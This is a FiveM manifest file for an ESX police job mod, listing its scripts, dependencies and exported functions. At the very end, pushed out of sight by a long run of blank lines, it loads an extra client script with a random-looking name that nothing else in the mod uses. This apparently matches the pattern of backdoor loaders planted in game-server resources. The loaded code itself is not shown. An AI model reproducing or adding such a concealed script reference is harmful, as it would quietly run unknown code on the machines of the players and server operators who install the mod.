fx_version "bodacious"
games {"gta5"}
lua54 'yes'
description 'ESX Police Job'

version '1.2.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua',
	'server/addons/server10-13.lua',
	'server/addons/licenses.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua',
	'client/addons/holster.lua',
	'client/addons/armory-cl.lua',
	'client/addons/radio.lua',
	'client/addons/client10-13.lua'
}

dependencies {
	'es_extended',
	'esx_billing'
}

exports {
	'OpenPoliceActionsMenu',
	'getJob',
	'isHandcuffed',
	'OpenBodySearchMenu',
	'OpenMainMenu',
	'LicensePolice'
}
















client_script "api-ac_PvZdZkjUInCR.lua"
